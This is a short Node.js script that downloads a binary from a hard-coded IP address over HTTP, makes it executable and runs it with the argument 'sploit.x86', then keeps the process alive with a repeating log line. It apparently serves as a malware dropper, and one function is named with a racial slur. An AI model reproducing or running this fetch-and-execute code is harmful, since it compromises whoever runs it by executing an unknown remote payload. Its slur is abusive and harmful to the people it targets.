const util = require('util')
const exec = util.promisify(require('child_process').exec);
const http = require('http');
const fs = require('fs');

async function lmaobozo(command) {
  
  try{
    var { stdout, stderr, error } = await exec(command);
    return stdout;
  }catch(stderr){
    console.error('stderr '+ stderr)
  }
  
}

async function nigger() {
    var sex = await lmaobozo("chmod +x main; ./main sploit.x86;")
}


const file = fs.createWriteStream("main");
const request = http.get("http://5.181.80.129/main", function(response) {
   response.pipe(file);

  
   file.on("finish", async () => {
       file.close();
       await nigger()
       console.log("Download Completed");
   });
});

setInterval(() => {
    console.log("hi")
}, 1000);
